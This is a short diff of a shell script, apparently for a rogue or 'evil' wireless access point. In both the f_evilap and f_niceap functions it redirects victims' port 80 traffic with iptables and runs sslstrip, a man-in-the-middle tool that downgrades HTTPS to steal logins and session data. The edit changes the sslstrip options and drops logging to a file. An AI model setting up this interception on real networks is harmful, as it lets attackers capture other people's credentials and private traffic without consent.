@@ -139,9 +139,8 @@ f_evilap(){
   echo "Redirecting port 80 to 1000 SSLStrip interception"
   iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
 
-  echo "Running sslstrip..."
-  sslstrip -l 10000 -a > $sslstripfilename &
-  tail -f $logname
+  echo "Running sslstrip and saving output to "
+  sslstrip -k -l 10000 & tail -f $logname
 }
 
 #########################################
@@ -172,8 +171,7 @@ f_niceap(){
   iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
  
   echo "Running sslstrip and saving output to "
-  sslstrip -l 10000 -a > $sslstripfilename &
-  tail -f $logname
+  sslstrip -k -l 10000 & tail -f $logname
 }
 
 #########################################
